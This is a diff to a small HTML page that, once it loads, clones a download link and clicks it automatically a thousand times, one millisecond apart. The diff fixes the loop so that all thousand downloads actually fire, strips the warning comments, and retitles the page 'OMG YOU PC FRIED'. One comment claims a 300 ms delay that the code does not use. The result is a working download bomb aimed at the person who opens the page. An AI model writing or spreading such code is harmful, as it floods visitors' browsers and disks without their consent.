@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Download Super Fast Copies</title>
+  <title>OMG YOU PC FRIED</title>
 </head>
 <body>
   <a id="download-link" 
@@ -13,31 +13,19 @@
     document.addEventListener("DOMContentLoaded", function() {
       const link = document.getElementById('download-link');
 
-      // Set to the lowest realistic possible delay
-      // WARNING: Most browsers will block this after the first few hundred!
-      // Browsers might prompt the user to allow, or block after N attempts.
-      const COPIES = 1000; // Reduced from 6767! Realistically, most browsers will stop at ~100-200
-      const DELAY = 0.1; // in milliseconds - lowest possible (100 microseconds)
-
-      for (let i = 1000; i <= COPIES; i++) {
+      for (let i = 1; i <= 1000; i++) {
         setTimeout(() => {
+          // create a new <a> tag for each download attempt
           const tempLink = link.cloneNode(true);
-          tempLink.download = `photo${i}.jpg`;
+          tempLink.download = `photo${i}.jpg`;  // new name each time
           document.body.appendChild(tempLink);
           tempLink.click();
           tempLink.remove();
-        }, i * DELAY);
+        }, i * 1); // wait 300ms between downloads
       }
     });
-
-    // 
   </script>
 
-  <p>
-   
-  </p>
-  <script>
-    document.getElementById('copies').textContent = '1000'; // Update if COPIES value changes
-  </script>
+  <p>Attempting to download HACK. :D sorry :( :) </p>
 </body>
 </html>
